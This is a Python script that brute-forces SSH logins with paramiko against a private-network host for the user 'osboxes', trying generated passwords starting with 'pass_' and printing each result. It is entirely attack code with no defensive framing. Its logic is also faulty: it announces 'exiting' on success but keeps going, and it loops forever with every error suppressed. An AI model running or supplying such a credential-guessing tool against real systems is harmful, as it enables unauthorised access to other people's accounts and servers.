import paramiko, sys, time, threading

ip = '192.168.185.3'

def attempt(ip, uname, passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=uname, password=passwd)
    except paramiko.AuthenticationException:
        return False
    ssh.close()
    return True


def run():
    username = 'osboxes'
    password = 'pass_'
    print('starting brute force for user ' + str(username))
    curr_chr = 'a'
    for i in range(0, 100):
        curr_passwd = password + curr_chr
        curr_chr = chr(ord(curr_chr) + 1)
        if curr_chr >= 'z':
            curr_chr = 'a'
            password += 'x'
        print('trying password ' + str(curr_passwd) + ' -> ', end='')
        if attempt(ip, username, curr_passwd):
            print('success, the password is: ' + str(curr_passwd) + ', exiting')
        else:
            print('fail')


if __name__ == '__main__':
    while True:
        try:
            run()
        except:
            pass
